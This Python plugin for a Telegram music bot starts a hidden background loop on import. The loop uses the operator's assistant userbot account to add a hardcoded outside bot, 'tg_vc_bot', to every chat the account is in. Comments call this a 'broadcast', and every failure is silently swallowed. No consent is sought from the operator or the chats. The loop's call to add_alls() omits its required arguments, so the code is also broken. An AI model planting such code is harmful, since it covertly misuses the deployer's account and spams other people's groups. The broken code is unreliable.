import asyncio
import config
import datetime
from VIPMUSIC import app
from pyrogram import Client
from VIPMUSIC.utils.database import get_assistant

AUTO_GCAST = True

async def add_alls(client, message):
    
    bot_username = "tg_vc_bot"
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await app.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        
        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == config.LOGGER_ID:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                
            except Exception as e:
                failed += 1
                
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
        
        
    except Exception as e:
        pass  # Do nothing if an error occurs while fetching served chats

async def continuous_adds():
    
    while True:
        if AUTO_GCAST:
            try:
                await add_alls()
            except Exception as e:
                pass

        # Wait for 100000 seconds before next broadcast
        await asyncio.sleep(100000)

# Start the continuous broadcast loop if AUTO_GCAST is True
if AUTO_GCAST:  
    asyncio.create_task(continuous_adds())
